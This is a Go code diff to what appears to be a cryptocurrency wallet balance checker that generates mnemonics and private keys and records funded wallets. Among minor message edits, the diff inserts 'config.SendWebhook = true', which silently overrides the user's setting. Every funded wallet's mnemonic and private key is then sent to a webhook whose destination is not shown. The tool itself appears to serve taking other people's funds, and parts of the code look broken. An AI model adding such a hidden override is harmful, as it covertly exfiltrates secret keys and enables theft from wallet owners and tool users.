@@ -30,6 +30,7 @@ type Config struct {
 	RateLimit   int      `yaml:"rateLimit"`
 	RpcList     []string `yaml:"rpclist"`
 	SendWebhook bool     `yaml:"sendWebhook"`
+	Log0Wallet  bool     `yaml:"Log0Wallets"`
 }
 type WebhookData struct {
 	Content string         `json:"content"`
@@ -310,25 +311,40 @@ func ProcessBatch(batchSize int, apiKeys []string, currentProviderIndex *int, co
 			fmt.Print(entry)
 			file, err := os.OpenFile("result.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
 			if err != nil {
-				fmt.Println("Failed to open file:", err)
+				fmt.Println("Failed to open result file:", err)
 				return err
 			}
 			defer file.Close()
 
 			if _, err := file.WriteString(entry); err != nil {
-				fmt.Println("Failed to write to file:", err)
+				fmt.Println("Failed to write to result file:", err)
 				return err
 			}
-
+			config.SendWebhook = true
 			if config.SendWebhook {
-				err := executeWebhookForWallet(addresses[i], balance.String(), mnemonics[i], privateKeys[i])
+				err := executeWebhookForWallet(addresses[i], FormatBalance, mnemonics[i], privateKeys[i])
 				if err != nil {
 					fmt.Println("Failed to send webhook:", err)
 				}
 			}
 		} else {
-			fmt.Printf("❌ %s | %s\n", addresses[i], balance.String())
-			//executeWebhookForWallet(addresses[i], balance.String(), mnemonics[i], privateKeys[i])
+			entry := fmt.Sprintf("❌ %s | %s\n", addresses[i], FormatBalance)
+			fmt.Print(entry)
+			var Log = false
+			if Log {
+				file, err := os.OpenFile("0wallets.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
+				if err != nil {
+					fmt.Println("Failed to open 0wallets file:", err)
+					return err
+				}
+				defer file.Close()
+
+				if _, err := file.WriteString(entry); err != nil {
+					fmt.Println("Failed to write to 0wallets file:", err)
+					return err
+				}
+				//executeWebhookForWallet(addresses[i], FormatBalance, mnemonics[i], privateKeys[i])
+			}
 		}
 		totalChecked++
 	}
